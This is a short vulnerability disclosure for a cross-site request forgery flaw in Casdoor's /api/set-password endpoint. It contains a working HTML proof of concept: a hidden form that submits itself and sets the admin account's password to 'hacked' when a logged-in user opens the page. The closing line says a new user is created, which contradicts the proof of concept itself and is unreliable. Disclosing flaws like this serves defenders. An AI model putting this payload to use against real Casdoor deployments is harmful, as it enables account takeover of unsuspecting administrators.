Overview
==================================================
Casdoor v2.95.0 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint /api/set-password. 
This vulnerability allows attackers to arbitrarily change the victim user's password via supplying a crafted URL.

Proof of Concept
==================================================

Made an unauthorized request to /api/set-password that bypassed the old password entry authentication step

<html>
<form action="http://localhost:8000/api/set-password" method="POST">
    <input name='userOwner' value='built&#45;in' type='hidden'>
    <input name='userName' value='admin' type='hidden'>
    <input name='newPassword' value='hacked' type='hidden'>
    <input type=submit>
</form>
<script>
    history.pushState('', '', '/');
    document.forms[0].submit();
</script>

</html>

If a user is logged into the Casdoor Webapp at time of execution, a new user will be created in the app with the following credentials

userOwner: built&#45;in
userName: admin
newPassword: hacked
